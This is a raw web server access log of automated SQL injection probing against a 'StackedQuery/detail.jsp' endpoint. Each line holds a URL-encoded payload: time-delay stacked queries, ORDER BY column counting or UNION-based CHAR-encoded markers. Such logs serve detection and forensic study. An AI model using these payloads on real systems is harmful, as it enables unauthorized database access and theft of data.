10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 1648
10.59.90.204 - - [21/Dec/2023:08:35:21 +0700] "GET /StackedQuery/detail.jsp?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 1714
10.59.90.204 - - [21/Dec/2023:08:35:21 +0700] "GET /StackedQuery/detail.jsp?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A0%27-- HTTP/1.1" 200 1714
10.59.90.204 - - [21/Dec/2023:08:35:26 +0700] "GET /StackedQuery/detail.jsp?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 1714
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20ORDER%20BY%201--%20CPhL HTTP/1.1" 200 1714
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20ORDER%20BY%205261--%20IckD HTTP/1.1" 200 1648
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20ORDER%20BY%2010--%20jFep HTTP/1.1" 200 1648
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20ORDER%20BY%206--%20FePq HTTP/1.1" 200 1648
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20ORDER%20BY%204--%20znHs HTTP/1.1" 200 1714
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20ORDER%20BY%205--%20izRw HTTP/1.1" 200 1648
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28108%29%2BCHAR%2875%29%2BCHAR%28111%29%2BCHAR%28117%29%2BCHAR%28117%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%28121%29%2BCHAR%28120%29%2BCHAR%28114%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2871%29%2BCHAR%28119%29%2BCHAR%2865%29%2BCHAR%28118%29%2BCHAR%2881%29%2BCHAR%2898%29%2BCHAR%2873%29%2BCHAR%28102%29%2BCHAR%2868%29%2BCHAR%28117%29%2BCHAR%28101%29%2BCHAR%2873%29%2BCHAR%28117%29%2BCHAR%2897%29%2BCHAR%28100%29%2BCHAR%28122%29%2BCHAR%2873%29%2BCHAR%2899%29%2BCHAR%2874%29%2BCHAR%28121%29%2BCHAR%28101%29%2BCHAR%28108%29%2BCHAR%2881%29%2BCHAR%2889%29%2BCHAR%2887%29%2BCHAR%2880%29%2BCHAR%2872%29%2BCHAR%2878%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29--%20WrNf HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:34 +0700] "GET /StackedQuery/detail.jsp?id=1%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%2879%29%2BCHAR%28121%29%2BCHAR%2871%29%2BCHAR%2890%29%2BCHAR%2868%29%2BCHAR%2865%29%2BCHAR%28109%29%2BCHAR%2872%29%2BCHAR%28115%29%2BCHAR%28114%29%2BCHAR%2866%29%2BCHAR%28105%29%2BCHAR%2898%29%2BCHAR%2875%29%2BCHAR%2881%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%2873%29%2BCHAR%2889%29%2BCHAR%28114%29%2BCHAR%28122%29%2BCHAR%2875%29%2BCHAR%28101%29%2BCHAR%2865%29%2BCHAR%2881%29%2BCHAR%2881%29%2BCHAR%2881%29%2BCHAR%28109%29%2BCHAR%28112%29%2BCHAR%28108%29%2BCHAR%28108%29%2BCHAR%2888%29%2BCHAR%28104%29%2BCHAR%2880%29%2BCHAR%2865%29%2BCHAR%2878%29%2BCHAR%28118%29%2BCHAR%2881%29%2BCHAR%2871%29%2BCHAR%2882%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL--%20qgzU HTTP/1.1" 200 1653
